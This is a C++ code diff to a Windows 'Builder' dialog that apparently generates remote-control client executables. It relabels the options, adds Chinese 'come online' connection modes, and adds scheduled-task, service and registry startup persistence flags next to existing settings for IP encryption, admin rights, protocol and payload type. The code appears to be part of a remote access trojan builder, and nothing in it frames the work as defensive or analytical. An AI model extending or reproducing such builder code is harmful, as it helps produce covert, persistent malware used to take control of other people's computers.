@@ -9,8 +9,11 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 
-#include <winsock2.h>
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
+#include <winsock2.h>
 #include "BuilderDialog.h"
 #include "../GlobalState.h"
 #include "../NetworkHelper.h"
@@ -40,7 +43,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         // EXE类型 Combobox
         HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
         if (hComboExeType) {
-            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"EXE (控制台)");
+            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"Client.exe");
             SendMessageW(hComboExeType, CB_SETCURSEL, 0, 0);
         }
         
@@ -56,9 +59,8 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         // 运行类型 Combobox
         HWND hComboRunType = GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE);
         if (hComboRunType) {
-            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"正常运行");
-            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"隐藏运行");
-            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"服务运行");
+            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"随机上线");
+            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"并发上线");
             SendMessageW(hComboRunType, CB_SETCURSEL, 0, 0);
         }
         
@@ -170,6 +172,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             
             bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
             bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED);
+            bool taskStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_TASK_STARTUP) == BST_CHECKED);
+            bool serviceStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_SERVICE_STARTUP) == BST_CHECKED);
+            bool registryStartup = (IsDlgButtonChecked(hDlg, IDC_CHECK_REGISTRY_STARTUP) == BST_CHECKED);
             int bitsIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_BITS), CB_GETCURSEL, 0, 0);
             bool buildBoth = (bitsIndex == 2);
             bool is64Bit = (bitsIndex == 1);
@@ -265,6 +270,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         pAddr->bEncrypt = encryptIp ? 1 : 0;
                         pAddr->runasAdmin = (char)(runAsAdmin ? 1 : 0);
                         pAddr->iStartup = startup ? 1 : 0;
+                        pAddr->taskStartup = (char)(taskStartup ? 1 : 0);
+                        pAddr->serviceStartup = (char)(serviceStartup ? 1 : 0);
+                        pAddr->registryStartup = (char)(registryStartup ? 1 : 0);
                         pAddr->runningType = (char)runTypeIndex;
                         pAddr->protoType = (char)protocolIndex;
                         pAddr->payloadType = (char)payloadIndex;
